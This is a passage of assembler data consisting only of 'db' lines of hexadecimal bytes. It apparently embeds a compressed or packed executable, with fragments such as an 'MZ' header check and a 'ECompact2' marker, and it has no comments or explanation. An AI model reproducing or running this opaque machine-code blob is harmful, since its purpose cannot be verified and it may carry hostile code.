db 0a0h,083h,074h,083h,013h,0cch,000h,080h,08ah,004h,041h,083h,0e0h,008h,03bh
db 0c3h,074h,036h,0ffh,04dh,0fch,057h,0e7h,010h,079h,086h,017h,017h,0bdh,050h
db 0bch,01dh,046h,001h,046h,08bh,0f5h,013h,0d9h,0a3h,074h,00eh,00ch,020h,0ebh
db 045h,0eeh,080h,03eh,025h,0a2h,067h,083h,037h,0d9h,008h,0cbh,0e7h,079h,09eh
db 0c3h,0e8h,0e9h,0f2h,0f1h,014h,087h,019h,09ah,0eah,087h,0b0h,0d0h,036h,0fbh
db 000h,0e4h,0e0h,088h,009h,063h,001h,0f4h,0c6h,045h,0f3h,001h,0d0h,01dh,01eh
db 037h,039h,05eh,0c3h,06ah,004h,025h,03dh,0d9h,071h,0c3h,004h,012h,0a0h,019h
db 006h,06fh,0f4h,0ffh,08dh,004h,080h,060h,016h,044h,0cbh,043h,0d0h,089h,0ebh
db 062h,081h,0b1h,000h,065h,083h,0fbh,04eh,07fh,03eh,074h,05eh,02ah,074h,032h
db 09ch,076h,08dh,003h,046h,074h,054h,049h,04eh,050h,0a3h,041h,04ch,0feh,014h
db 0c5h,002h,030h,0ebh,045h,080h,07eh,001h,036h,075h,02ch,002h,040h,0bfh,000h
db 03ah,046h,002h,075h,023h,0d0h,083h,065h,0d8h,070h,04bh,062h,058h,000h,0dch
db 080h,05dh,020h,02eh,0ebh,027h,0f2h,0ebh,022h,068h,074h,017h,083h,0ech,005h
db 0b1h,06ch,077h,074h,008h,040h,0b8h,0fbh,082h,0f1h,0ebh,00eh,0fbh,0ebh,006h
db 020h,00dh,00dh,01ch,0feh,04dh,0f3h,0fbh,080h,07dh,0f1h,04fh,0ffh,0b4h,049h
db 00eh,0b0h,093h,00dh,076h,085h,089h,075h,028h,016h,0f8h,027h,010h,0bch,083h
db 0c0h,004h,010h,023h,04bh,047h,01ch,08bh,040h,0fch,0d4h,07dh,013h,08eh,021h
db 08ch,075h,014h,03ch,053h,02fh,0e4h,029h,030h,03ch,043h,080h,0cbh,060h,047h
db 0b0h,0ffh,0ebh,004h,0fbh,001h,024h,023h,0d8h,05dh,00ch,033h,083h,0ceh,020h
db 083h,0feh,06eh,0a7h,01eh,006h,030h,0c4h,029h,020h,016h,01ch,063h,074h,014h
db 07bh,074h,00fh,0ceh,0c2h,02bh,0b8h,008h,0ceh,0e9h,02ch,0feh,0ebh,00bh,0ffh
db 0a3h,0b0h,026h,06ch,016h,0e6h,059h,0ech,058h,088h,047h,004h,039h,074h,009h
db 0b2h,08ah,060h,083h,0f4h,0dch,032h,014h,090h,02fh,06fh,00fh,08fh,05eh,059h
db 074h,070h,06eh,00ah,005h,063h,082h,0c3h,0d1h,001h,02ch,002h,064h,0f8h,004h
db 00fh,08eh,06ah,003h,062h,061h,0ceh,067h,07eh,038h,069h,074h,01bh,0a7h,007h
db 06dh,088h,06eh,057h,002h,072h,0d1h,08ch,0ddh,0fch,081h,0d1h,028h,087h,000h
db 007h,015h,0f1h,06ah,064h,05eh,08bh,07ah,0c4h,0b5h,0ech,02dh,081h,073h,07ah
db 080h,07eh,0e9h,001h,0e9h,07ah,042h,048h,05dh,064h,08dh,0b5h,03ch,02ch,0a8h
db 09dh,06dh,075h,00eh,088h,09dh,053h,00fh,0e8h,0a4h,03dh,05ah,002h,0e9h,03ch
db 02bh,075h,017h,0cah,0cah,039h,096h,076h,04eh,0cch,0b1h,020h,0f2h,049h,037h
db 08bh,0d8h,06eh,0d0h,03ah,0dbh,083h,07dh,0e0h,000h,010h,0b9h,035h,0d0h,081h
db 07dh,0f4h,05dh,07eh,007h,043h,043h,04eh,035h,0c7h,037h,046h,089h,00ch,053h
db 043h,0f2h,0c6h,050h,00bh,0a1h,0b4h,074h,07ch,06ch,058h,021h,0e0h,09ah,04ch
db 0ceh,017h,0e4h,088h,01eh,0bch,040h,0d5h,04dh,046h,0bbh,038h,01dh,06ch,071h
db 059h,0e8h,022h,075h,066h,05ch,0bah,0d0h,0b6h,03ch,0a0h,088h,006h,0dbh,055h
db 03bh,051h,046h,08fh,0e2h,00ah,064h,0e4h,08eh,000h,006h,071h,0a2h,011h,0fbh
db 065h,045h,0dbh,08eh,010h,072h,0dbh,05eh,0b0h,0f0h,076h,0c6h,006h,065h,0a8h
db 0f9h,065h,047h,0ceh,028h,026h,0f6h,046h,074h,06ah,05dh,06ch,01eh,0e3h,0e4h
db 0bah,0c6h,021h,00fh,0ceh,02bh,073h,0fah,012h,028h,0d7h,0e4h,0b3h,008h,051h
db 072h,04fh,0dfh,0f9h,014h,04eh,0a6h,0b7h,031h,08ch,013h,0f6h,005h,0e7h,039h
db 07ch,093h,04dh,005h,00fh,0d1h,02fh,006h,0cch,080h,026h,085h,094h,063h,010h
db 034h,050h,00fh,0beh,0f2h,019h,008h,0cfh,0d4h,048h,058h,050h,07dh,0d4h,06bh
db 0c3h,068h,06ah,0f7h,075h,00ah,0ffh,0c8h,0a0h,01ch,08bh,0c7h,072h,08dh,0eah
db 0a5h,07eh,0c0h,09ch,085h,0c0h,0eah,001h,0bfh,000h,082h,011h,0f6h,08bh,0c6h
db 083h,052h,096h,0d8h,026h,0e8h,070h,0a3h,0e2h,0b9h,040h,016h,0e8h,003h,0e8h
db 048h,048h,085h,082h,016h,0c7h,096h,0c3h,0fdh,096h,041h,0aeh,037h,0d7h,060h
db 0adh,0e9h,003h,03bh,041h,00fh,07eh,031h,03fh,019h,04eh,036h,0d6h,0ebh,0c3h
db 004h,02bh,037h,08ch,0d2h,0bch,031h,017h,0aeh,0c1h,017h,00ch,00bh,0c4h,00ch
db 047h,089h,080h,03fh,05eh,08bh,027h,078h,020h,0a7h,000h,0c7h,08dh,078h,001h
db 0b2h,023h,08ah,047h,022h,01bh,0a6h,074h,0c3h,0cdh,030h,0d0h,02eh,006h,0f1h
db 001h,0ebh,011h,0beh,078h,03dh,07ah,0fbh,030h,005h,09fh,09dh,043h,045h,002h
db 080h,0fbh,078h,020h,038h,016h,0b9h,074h,02fh,058h,074h,02ah,03ah,0b4h,011h
db 0f2h,078h,0e4h,0f4h,026h,0b8h,047h,06ah,06fh,05eh,013h,044h,01fh,0c9h,05dh
db 0d2h,082h,07ah,0e4h,07ch,06ah,030h,05bh,09ah,01dh,045h,0d5h,0cfh,006h,083h
db 0a5h,058h,06ah,078h,0ebh,0cfh,04ch,072h,0bch,067h,0f8h,081h,049h,0f8h,087h
db 042h,06ah,020h,058h,03bh,01ah,0c4h,09ch,06ah,027h,04bh,006h,071h,06ah,0ach
db 0c4h,07bh,000h,0c5h,026h,01bh,05dh,075h,009h,0b2h,05dh,047h,0d0h,00fh,082h
db 0bah,0a7h,020h,08ah,055h,0c3h,000h,0f7h,062h,0cbh,03ch,05dh,074h,05fh,047h
db 03ch,081h,0d3h,052h,0d4h,041h,03dh,08ah,00fh,080h,0f9h,00ch,00bh,080h,067h
db 036h,047h,03ah,0d1h,073h,004h,08ah,0c1h,0ebh,0c2h,042h,09eh,001h,0c2h,08ah
db 0d1h,03ah,0d0h,077h,021h,0d2h,090h,0ach,000h,000h,0f0h,02bh,0f2h,046h,08bh
db 0cah,08bh,0c2h,083h,0e1h,007h,0b3h,001h,0c1h,0d2h,0e3h,005h,000h,0a8h,081h
db 005h,09ch,008h,018h,042h,0b8h,00ch,0f8h,040h,000h,050h,064h,0ffh,035h,000h
db 000h,000h,000h,064h,089h,025h,000h,000h,000h,000h,033h,0c0h,089h,008h,050h
db 045h,043h,06fh,06dh,070h,061h,063h,074h,032h,000h,0d9h,098h,093h,0dbh,060h
db 021h,0ech,0c2h,092h,01dh,0b3h,00eh,096h,01ch,0e6h,053h,09ch,000h,0c4h,05bh
db 0d4h,01ah,0d3h,052h,0c8h,05bh,074h,07eh,0d6h,029h,0c9h,009h,06ah,001h,05ah
db 028h,00bh,09ah,005h,05dh,0e8h,0d3h,0e2h,0c1h,0f9h,003h,00bh,039h,063h,000h
db 04ch,00dh,09ch,033h,0cbh,085h,0d1h,074h,060h,075h,052h,023h,091h,04ch,014h
db 0eah,041h,008h,04fh,004h,043h,088h,045h,0c8h,0f6h,044h,06bh,059h,0ceh,004h
db 041h,001h,080h,074h,00dh,059h,05bh,004h,00dh,002h,0c9h,0ffh,035h,08dh,0ceh
db 090h,007h,0e6h,0c2h,099h,0ech,024h,0a4h,026h,077h,0c2h,08ch,069h,018h,0ddh
db 066h,089h,046h,0a6h,0d9h,020h,0e1h,091h,088h,0afh,0e8h,0d4h,012h,0afh,093h
db 0f1h,071h,091h,04dh,092h,06fh,09ch,0abh,000h,039h,0aah,019h,004h,072h,028h
db 003h,057h,02dh,0b7h,01dh,07fh,002h,04bh,0c5h,0f4h,014h,072h,008h,098h,049h
db 03ch,0d4h,066h,083h,020h,0fah,0b1h,018h,018h,080h,093h,055h,072h,026h,025h
db 0ceh,07bh,08ah,075h,0e9h,005h,0bbh,043h,0abh,09ah,022h,0b3h,082h,03bh,0d0h
db 00fh,001h,0c7h,079h,022h,06eh,0f1h,0e3h,000h,035h,015h,0fbh,031h,075h,04fh
db 025h,071h,091h,016h,08bh,03ah,0ebh,01bh,00dh,025h,01eh,051h,033h,059h,0a3h
db 08ch,069h,080h,09ah,0d8h,08bh,055h,0dch,0e5h,070h,016h,03ch,059h,028h,08bh
db 053h,089h,089h,079h,0b3h,08ch,0cah,0afh,053h,0d1h,0bch,05ah,0a7h,05dh,013h
db 0dch,01bh,0b3h,075h,015h,038h,07dh,053h,0f8h,034h,09fh,03fh,003h,0fah,0c6h
db 03ah,025h,00ah,011h,0b4h,010h,016h,0dch,0d8h,04bh,009h,04dh,0f3h,037h,08dh
db 0c1h,02ch,010h,08bh,099h,001h,011h,0efh,0c8h,0c8h,0cdh,005h,0f1h,020h,0cfh
db 0a8h,020h,042h,0d7h,056h,0e6h,00eh,076h,0f3h,0feh,0e9h,0d7h,027h,0ceh,044h
db 0b3h,0d0h,09ah,000h,04dh,0dch,0f7h,0d8h,083h,0d1h,000h,0f7h,0d9h,089h,067h
db 046h,0d1h,00ch,0afh,002h,062h,0e1h,063h,0b2h,074h,03fh,070h,074h,03ah,047h
db 0e7h,015h,031h,076h,00ah,06ah,056h,000h,040h,06ch,0c1h,0e7h,003h,0ebh,03fh
db 08dh,03ch,0bfh,0d1h,0e7h,0ebh,038h,09fh,051h,02fh,0fch,074h,037h,053h,004h
db 06ch,03bh,06eh,00fh,0f1h,0eeh,046h,0a0h,08dh,07ch,01fh,0d0h,014h,0f5h,080h
db 065h,003h,0d7h,074h,002h,0f7h,0dfh,046h,075h,004h,083h,065h,0dch,06dh,0e9h
db 060h,0e4h,04bh,0e6h,0ach,03dh,0ceh,029h,096h,018h,097h,055h,0d0h,010h,0cch
db 04ch,0bfh,06dh,0deh,002h,085h,019h,008h,089h,048h,004h,0ebh,010h,0aeh,061h
db 0e1h,012h,0f3h,004h,089h,038h,0ebh,002h,062h,0d1h,066h,0feh,045h,0ebh,023h
db 0a1h,01bh,011h,00ch,0ebh,042h,09ah,07fh,04dh,0f3h,06ah,0f9h,009h,0c8h,03bh
db 0c3h,0eah,01ch,094h,0cah,055h,0e7h,08eh,0a7h,041h,018h,0e4h,0e2h,05ch,04ch
db 00eh,0c8h,023h,0afh,0deh,046h,03eh,004h,0c4h,089h,067h,075h,03eh,025h,075h
db 04dh,095h,060h,020h,0e3h,0e0h,0adh,008h,07bh,06eh,0f0h,08ah,084h,043h,0b6h
db 034h,006h,084h,056h,0f6h,0ebh,030h,074h,098h,064h,063h,0ceh,01ch,0c9h,0bfh
db 095h,0c3h,03ch,047h,017h,059h,094h,0bbh,0ceh,098h,0c9h,0a2h,045h,011h,0ebh
db 046h,071h,032h,0cch,00dh,038h,085h,031h,0c1h,03fh,083h,0c8h,003h,078h,0bdh
db 002h,0a1h,05fh,05eh,05bh,0c9h,0c3h,056h,07eh,004h,03eh,072h,08eh,008h,0d2h
db 046h,004h,03dh,056h,0f9h,03eh,0fbh,0dch,070h,0d8h,083h,086h,00fh,07bh,034h
db 0bch,033h,083h,0e6h,0eeh,007h,001h,0c2h,08bh,004h,05eh,0c3h,0ffh,04ah,004h
db 078h,009h,08bh,00ah,0f6h,012h,000h,018h,001h,041h,089h,00ah,0c3h,052h,0b6h
db 0c8h,026h,045h,0aah,07ch,0fbh,003h,00fh,06ch,014h,0abh,0d3h,070h,029h,083h
db 022h,067h,002h,09eh,056h,057h,063h,071h,086h,0d1h,010h,0ffh,006h,0f8h,060h
db 0a3h,012h,030h,088h,0a3h,001h,0b6h,059h,075h,0e7h,04dh,0c3h,049h,04dh,05fh
db 04ch,0f7h,0c1h,06ah,042h,03dh,0bbh,014h,08ah,0ceh,0e2h,05ch,014h,040h,0eah
db 0d9h,062h,0c1h,075h,0f1h,005h,040h,05eh,004h,000h,001h,0bah,0ffh,0feh,0feh
db 07eh,003h,0d0h,083h,0f0h,0ffh,033h,0c1h,004h,0a9h,0aeh,00bh,000h,0dfh,001h
db 081h,074h,0e8h,08bh,041h,0fch,044h,08bh,073h,069h,032h,024h,058h,0f4h,0a7h
db 0dfh,013h,0f0h,086h,01ch,0d7h,0ebh,0c9h,082h,0aah,009h,0cdh,08dh,041h,0ffh
db 02bh,0c1h,0c3h,0fah,059h,067h,01dh,0feh,0fdh,0fch,0c0h,018h,0c5h,02bh,08dh
db 0b4h,04eh,098h,016h,05bh,0a4h,024h,0a0h,037h,060h,02ch,08dh,064h,033h,0c0h
db 08ah,044h,053h,0c2h,023h,060h,0c6h,0c1h,0e0h,008h,002h,080h,06dh,01bh,008h
db 0f7h,0c2h,013h,08ah,00ah,042h,038h,0d9h,074h,0d1h,084h,0c9h,074h,051h,064h
db 001h,0c0h,0d2h,075h,0edh,00bh,0d8h,057h,08bh,0c3h,0c1h,0e3h,010h,056h,02ah
db 037h,0a2h,011h,0bfh,0bbh,02ah,0d5h,050h,086h,0e0h,00dh,080h,0cbh,003h,0f0h
db 003h,0f9h,083h,0f1h,0ffh,0cfh,033h,09ah,037h,0e0h,02eh,0c2h,004h,081h,0e1h
db 019h,0cbh,0f4h,00dh,075h,01ch,025h,0d3h,07bh,009h,0d2h,010h,001h,081h,0e6h
db 040h,0bfh,02ah,0a0h,075h,0c4h,05eh,05fh,05bh,08bh,042h,0fch,038h,09ch,036h
db 0d2h,044h,0d8h,0efh,05fh,091h,0d7h,008h,038h,0dch,074h,027h,0e7h,0e7h,079h
db 04ah,067h,015h,0dch,006h,01ch,04fh,0dah,085h,0d4h,0ebh,096h,03eh,08dh,07bh
db 02fh,042h,0feh,0fdh,0f5h,017h,00dh,03ah,0fch,0a1h,014h,0e0h,030h,064h,060h
db 018h,0ffh,0d0h,068h,014h,076h,049h,089h,065h,008h,052h,047h,0ceh,0c2h,06fh
db 068h,004h,000h,01ch,0aah,0d6h,0a0h,042h,04bh,06dh,0f5h,00ch,02ch,0fbh,0e8h
db 038h,018h,0d6h,00ch,001h,057h,0a5h,018h,020h,0f0h,05fh,039h,03dh,038h,031h
db 06dh,0c8h,032h,015h,0c4h,087h,071h,0b1h,095h,0c0h,00fh,028h,0e5h,0a1h,00ch
db 003h,0f6h,020h,093h,089h,03dh,034h,0cbh,0b0h,041h,0e8h,082h,088h,01dh,030h
db 03ch,0a1h,010h,070h,0e8h,007h,0f1h,022h,00ch,0e0h,056h,08dh,04ch,0f9h,0dah
db 000h,071h,0fch,03bh,0f0h,072h,013h,08bh,006h,00dh,048h,05ch,0a0h,004h,03bh
db 035h,073h,0edh,05eh,068h,020h,03ch,0a6h,08eh,0a8h,018h,070h,047h,0d0h,002h
db 068h,028h,024h,085h,0dbh,048h,05fh,0b0h,061h,05bh,089h,0c6h,015h,0cdh,0d8h
db 075h,0e3h,06bh,0c9h,05fh,03bh,027h,059h,0d7h,044h,073h,00dh,0c6h,05fh,091h
db 068h,029h,0fdh,0cbh,00eh,0d3h,053h,0dbh,0a4h,0e3h,012h,01ah,0cah,072h,090h
db 009h,00eh,020h,001h,08bh,058h,008h,01ah,0c0h,0b2h,087h,015h,005h,0a4h,03ah
db 022h,03eh,060h,008h,058h,00bh,068h,011h,05ch,01ah,0c7h,001h,009h,09dh,04bh
db 064h,0f6h,00dh,03ch,049h,0cah,055h,0c3h,034h,05bh,016h,0e5h,00ch,089h,08bh
db 042h,098h,004h,0f8h,083h,0f9h,008h,0c8h,0c5h,082h,063h,0ddh,088h,082h,08bh
db 015h,08ch,00bh,0c4h,002h,080h,003h,0d1h,056h,03bh,0cah,07dh,015h,08dh,034h
db 049h,02bh,0d1h,0b5h,018h,00bh,020h,02ch,04ah,083h,026h,0c6h,00ch,04ah,075h
db 0f7h,08bh,0dfh,084h,03ch,08ch,035h,094h,03dh,0c4h,02ch,0a4h,013h,0c0h,0c7h
db 005h,0ceh,093h,016h,038h,083h,000h,0ebh,070h,03dh,090h,081h,03bh,0e8h,0bch
db 083h,05dh,03dh,091h,084h,04ah,03dh,093h,0e8h,0bch,083h,0ceh,085h,037h,03dh
db 08dh,082h,024h,0a3h,083h,0ceh,03bh,03dh,08fh,086h,011h,03dh,092h,00ah,0c8h
db 090h,0cdh,0e3h,08ah,0ffh,06ah,0a7h,019h,08ch,07ah,0d3h,091h,03eh,082h,029h
db 059h,05eh,0ebh,008h,051h,071h,08dh,0d2h,068h,0a3h,0b2h,0a6h,069h,01ch,06ch
db 086h,018h,035h,009h,0b6h,071h,01ah,08fh,0c8h,05bh,05dh,02ch,01eh,01eh,0ech
db 090h,039h,015h,010h,056h,0b8h,06eh,06ah,047h,054h,074h,00bh,000h,0d0h,0b9h
db 010h,0c0h,00ch,03bh,0c6h,073h,004h,039h,010h,075h,0f5h,08dh,00ch,049h,05eh
db 05ah,0a8h,05ah,00ch,08dh,03bh,0c1h,0b2h,026h,059h,049h,088h,043h,0b7h,068h
db 008h,0e0h,000h,0d0h,00ch,032h,087h,02dh,0f7h,056h,057h,0f4h,01ah,02ah,0a3h
db 00dh,012h,0d0h,022h,075h,025h,08ah,090h,049h,06bh,08eh,011h,028h,05fh,066h
db 01dh,029h,00ch,006h,09eh,043h,0f1h,074h,0e6h,046h,0ebh,0e3h,070h,02ch,0c2h
db 003h,00dh,00ah,03ch,0c0h,09ch,062h,028h,020h,076h,020h,077h,01eh,04ch,0c2h
db 060h,0fah,0fch,065h,03eh,047h,0e9h,04dh,048h,09bh,080h,053h,033h,0dbh,039h
db 01dh,056h,057h,047h,088h,0b6h,0beh,002h,0e0h,05ch,044h,033h,0ffh,03ah,0c3h
db 074h,012h,03ch,03dh,074h,001h,047h,01dh,006h,052h,006h,017h,03bh,059h,08dh
db 0edh,047h,009h,0c0h,001h,0ebh,0e8h,08dh,004h,0bdh,004h,020h,01ah,08ah,0d3h
db 02fh,07bh,059h,03bh,0f3h,054h,0aeh,091h,0cch,018h,071h,05ah,0cch,0abh,009h
db 00ch,041h,0a0h,060h,0e2h,098h,03dh,038h,01fh,074h,032h,001h,0cbh,017h,039h
db 055h,057h,08bh,0e8h,059h,045h,080h,03fh,019h,069h,0f4h,042h,022h,055h,0b9h
db 00bh,07eh,084h,006h,091h,0c5h,0b2h,0cah,036h,0f7h,042h,077h,009h,02eh,08bh
db 059h,059h,003h,0fdh,059h,037h,062h,003h,075h,0c9h,05dh,0ffh,0d0h,0b2h,058h
db 017h,013h,01dh,089h,01eh,038h,056h,0aeh,081h,004h,0adh,059h,0b3h,064h,0e0h
db 05bh,0e1h,0eah,037h,044h,051h,051h,0beh,040h,069h,043h,0a9h,0b2h,099h,041h
db 023h,00ch,056h,053h,0a1h,078h,088h,093h,0d2h,028h,08bh,0feh,0deh,081h,034h
db 02bh,038h,018h,036h,012h,083h,004h,08dh,045h,0f8h,050h,053h,053h,097h,03ch
db 00bh,0fah,01ch,0b7h,08bh,01ah,081h,08dh,000h,0fch,088h,04dh,0b1h,062h,08ah
db 0f3h,019h,04eh,0ach,008h,0f2h,09ch,0a7h,0deh,073h,051h,0f5h,042h,086h,050h
db 056h,0fch,09bh,01eh,0dah,084h,014h,048h,010h,031h,05ah,063h,081h,0a3h,00ch
db 060h,096h,0b0h,0c9h,018h,023h,04fh,000h,0b7h,014h,053h,056h,083h,021h,08ah
db 085h,0a1h,00eh,057h,082h,063h,0abh,037h,0c7h,03dh,08ch,03ah,0d1h,08ch,0d6h
db 0c2h,0c0h,037h,083h,0c7h,004h,038h,022h,019h,068h,05ch,003h,050h,053h,0c2h
db 01fh,0c2h,0fah,029h,001h,075h,052h,008h,025h,0f6h,082h,0e1h,0ddh,0a0h,09fh
db 0c2h,031h,004h,074h,001h,085h,0f6h,02dh,00bh,000h,0afh,08ah,010h,088h,016h
db 046h,040h,09ah,031h,08bh,09dh,0d5h,0ebh,0ceh,004h,027h,060h,0c2h,05eh,046h
db 05bh,016h,02dh,070h,0ebh,043h,005h,010h,013h,0c4h,0cdh,040h,0cah,0c8h,04eh
db 01fh,0dah,0f6h,083h,018h,079h,058h,02eh,0cch,020h,074h,009h,009h,05fh,083h
db 003h,064h,009h,075h,0cch,075h,003h,048h,023h,0c6h,094h,065h,066h,0ffh,04bh
db 071h,026h,08ch,018h,000h,03dh,0c4h,07ah,0dch,0e0h,037h,0d1h,0b9h,068h,005h
db 003h,04fh,0cfh,0aeh,085h,0f1h,0c8h,003h,08dh,000h,0cdh,08bh,055h,014h,0ffh
db 002h,0c7h,09eh,062h,0a5h,06bh,040h,0d2h,006h,020h,05ch,075h,004h,040h,043h
db 0ebh,0f7h,02ch,0f6h,0c3h,001h,010h,04ch,0b1h,0d6h,039h,07dh,0e6h,04bh,0d1h
db 0aeh,00dh,000h,006h,079h,016h,022h,08dh,050h,0c2h,0cch,08ch,07eh,06ah,0ebh
db 008h,0b1h,000h,06ch,08ah,033h,0d2h,018h,00fh,094h,0c2h,089h,06ch,098h,036h
db 040h,0d1h,0ebh,08bh,0d3h,04bh,085h,00eh,043h,005h,0e2h,00dh,084h,0c6h,006h
db 05ch,046h,04bh,075h,0f3h,08ah,0f2h,02fh,092h,00bh,04ah,083h,023h,065h,0a3h
db 09ah,00ah,03fh,0f4h,027h,01ah,0d2h,012h,05dh,0d0h,083h,02eh,019h,0feh,066h
db 09eh,038h,006h,001h,02bh,0deh,046h,00fh,045h,070h,0abh,0e5h,003h,040h,00ah
db 09eh,011h,05ah,01dh,0a3h,023h,072h,0ceh,073h,071h,092h,0ceh,010h,01eh,003h
db 083h,027h,014h,051h,0f6h,04dh,0beh,015h,024h,053h,0c0h,0a1h,044h,0cch,0e5h
db 029h,08ch,047h,08bh,02dh,0dch,021h,0dah,080h,043h,033h,0f6h,005h,0bah,004h
db 018h,075h,074h,04dh,02ah,088h,0d5h,0a6h,0f0h,05ah,0d3h,003h,05bh,042h,0edh
db 0ebh,028h,0d8h,0d7h,00ch,0c7h,0d4h,03bh,0fbh,0d6h,0e3h,0edh,01eh,0eah,002h
db 024h,098h,06ah,0f4h,01fh,048h,087h,0a9h,07dh,0abh,08fh,0f3h,0fch,02fh,00ch
db 0c2h,0d6h,0cdh,03ch,00ah,066h,039h,01eh,06ch,02ch,040h,016h,040h,040h,018h
db 075h,0f9h,00dh,087h,077h,018h,0f2h,02bh,0c6h,0d4h,070h,0d1h,0f8h,0a6h,008h
db 00bh,067h,040h,05eh,029h,0c3h,0e9h,00ch,0d4h,0c3h,0c0h,034h,0ffh,0d7h,03bh
db 0ebh,074h,032h,01ah,0eah,09ch,03ch,024h,070h,00bh,065h,023h,055h,050h,0a5h
db 096h,0cbh,07dh,024h,098h,0cch,022h,079h,00eh,010h,016h,0c9h,0f2h,073h,05ch
db 08bh,01eh,0ebh,082h,01dh,0d0h,064h,04ah,08ah,0c5h,08ah,049h,0b9h,001h,0f8h
db 002h,075h,04ch,038h,00ah,017h,04fh,074h,03ch,0b1h,0d8h,027h,000h,08bh,0c7h
db 074h,00ah,040h,038h,0fbh,073h,051h,027h,010h,0f6h,02bh,0c7h,040h,0ceh,024h
db 0e0h,006h,008h,010h,0d8h,037h,0eah,06ah,0ebh,0eah,049h,0f4h,049h,00bh,07eh
db 039h,04fh,085h,030h,03bh,057h,035h,059h,085h,08eh,0cch,0c6h,0ebh,0bdh,050h
db 0e4h,02bh,05bh,048h,0dfh,044h,0a3h,0ech,044h,054h,032h,04dh,0d1h,029h,00fh
db 052h,0ceh,01bh,0e4h,050h,00dh,0f2h,000h,0dfh,00ch,029h,007h,06ch,000h,0e0h
db 093h,029h,05dh,054h,086h,039h,0dah,025h,0d0h,073h,01ah,004h,069h,05ch,080h
db 03dh,0c6h,046h,005h,00ah,0a1h,068h,05bh,0a8h,027h,008h,005h,0ebh,065h,089h
db 086h,023h,0e2h,08dh,097h,04ch,016h,0e3h,066h,042h,0d9h,0b7h,0c8h,0ach,0c5h
db 044h,01ah,03ah,0f7h,045h,0b9h,030h,08dh,0b2h,00bh,009h,06eh,0b8h,060h,04fh
db 080h,0b2h,08dh,01ch,02eh,07ch,002h,039h,035h,032h,013h,068h,09ch,07dh,052h
db 0bfh,004h,0c0h,040h,0eeh,099h,04fh,0e0h,07fh,042h,038h,083h,089h,007h,08dh
db 088h,042h,09eh,0c1h,0e6h,071h,0fah,013h,0d8h,060h,008h,040h,027h,0b0h,087h
db 0c2h,08bh,00fh,008h,081h,0c1h,0ach,0d5h,020h,0e3h,0e4h,0d0h,092h,005h,09ch
db 07ch,0bbh,0ebh,006h,08bh,018h,088h,036h,0fbh,07eh,046h,08bh,003h,05fh,002h
db 0c0h,00fh,074h,036h,08ah,04dh,000h,0f6h,0c1h,001h,096h,01bh,010h,0c7h,008h
db 075h,00bh,0ach,02ch,017h,07ah,0e8h,01eh,033h,0cdh,01ah,0b0h,08bh,0cfh,0c1h
db 0f8h,005h,034h,03dh,023h,054h,004h,085h,0c8h,077h,001h,0e1h,0c8h,08bh,00bh
db 089h,008h,088h,05ah,002h,060h,05dh,047h,045h,083h,0c3h,004h,03bh,0feh,07ch
db 0bah,0a3h,0c1h,0ech,006h,03ch,0d8h,0ffh,0c8h,0beh,018h,0c8h,0d8h,075h,04dh
db 000h,0bdh,00ah,0c0h,004h,081h,06ah,0f6h,058h,0ebh,034h,01bh,000h,0d9h,0c3h
db 048h,0f7h,0d8h,01bh,0c0h,00bh,0edh,089h,04dh,0f5h,0e4h,058h,0e6h,004h,069h
db 074h,017h,057h,00ch,025h,01ah,023h,064h,0d5h,03eh,035h,0eah,028h,008h,006h
db 080h,04eh,01bh,086h,072h,0d4h,003h,02ch,016h,02ah,087h,008h,0ebh,004h,080h
db 07ch,003h,0f4h,052h,043h,003h,07ch,09bh,0ffh,0bah,07ah,0d8h,037h,0e0h,0adh
db 046h,0bfh,052h,044h,04ah,0ceh,052h,086h,06ah,004h,000h,023h,056h,066h,081h
db 038h,04dh,05ah,075h,014h,08bh,048h,03ch,085h,0c9h,0c9h,000h,0e0h,09bh,003h
db 0c1h,08ah,048h,01ah,088h,00eh,08ah,040h,01bh,088h,041h,0ebh,04ah,08eh,0b8h
db 02ch,012h,08ch,00dh,06ch,058h,035h,09bh,08dh,085h,068h,076h,02ch,0a4h,035h
db 0ffh,0c7h,068h,09ah,0bdh,052h,094h,0cdh,074h,05ah,060h,01ah,083h,0bdh,078h
db 0d5h,0f0h,040h,016h,011h,06ch,005h,072h,008h,01ch,0eah,0c5h,0fah,022h,0bah
db 0d4h,0edh,05fh,048h,09fh,025h,068h,090h,0f4h,022h,067h,003h,072h,0ech,0bbh
db 008h,061h,068h,0d0h,0b1h,010h,0b8h,018h,08dh,08dh,038h,09dh,000h,00ch,0a3h
db 052h,001h,03ch,061h,07ch,008h,03ch,07ah,07fh,085h,083h,0e5h,000h,004h,02ch
db 020h,088h,001h,041h,038h,019h,06ah,016h,02eh,026h,018h,0fch,0ech,071h,01ch
db 00bh,067h,08bh,008h,0ebh,049h,034h,061h,081h,039h,064h,0feh,0ceh,0b3h,07eh
db 08eh,014h,067h,05bh,092h,048h,0bbh,075h,0b5h,050h,06ch,001h,059h,098h,02ah
db 0e9h,016h,0a4h,08eh,09ah,005h,0c4h,03eh,06ah,02ch,017h,066h,018h,0cbh,061h
db 074h,030h,061h,0b0h,09ch,008h,0c8h,00eh,080h,039h,03bh,082h,0edh,00bh,090h
db 088h,019h,0ebh,0f2h,06ah,00ah,053h,0d5h,063h,043h,0e3h,033h,070h,018h,0fbh
db 015h,087h,074h,01dh,074h,018h,066h,0a9h,054h,057h,013h,0a2h,062h,00ch,0e0h
db 021h,048h,080h,07dh,0fch,006h,059h,003h,041h,007h,02dh,026h,0cch,053h,022h
db 09eh,039h,05dh,0e5h,080h,096h,010h,031h,013h,01bh,063h,0c0h,0f8h,017h,0fah
db 06ah,018h,0a3h,0e8h,0deh,036h,059h,024h,026h,08ah,075h,0a3h,0ech,0f3h,04ch
db 0b2h,0d0h,075h,00dh,068h,039h,0c4h,099h,0c2h,0cah,059h,079h,044h,066h,011h
db 018h,03eh,01bh,014h,01fh,069h,04ch,00fh,0c8h,06ah,00fh,0ffh,0f4h,019h,04ah
db 096h,033h,0c3h,045h,0e4h,041h,0f6h,0dah,02dh,048h,05ch,068h,038h,033h,00ch
db 004h,075h,023h,057h,07fh,05dh,0fah,017h,0e6h,0f8h,08bh,0e5h,0b4h,02fh,021h
db 00eh,041h,004h,006h,000h,0c6h,0c0h,02eh,01bh,074h,00fh,08bh,05fh,09eh,00bh
db 002h,010h,089h,002h,0b8h,0c3h,0b8h,0c3h,04ah,0d7h,0f1h,029h,081h,009h,06ah
db 0feh,068h,040h,064h,047h,043h,028h,070h,07ch,0a3h,032h,03bh,020h,013h,08fh
db 0ach,023h,08bh,070h,0a0h,046h,045h,05eh,024h,06ch,002h,0ech,035h,074h,028h
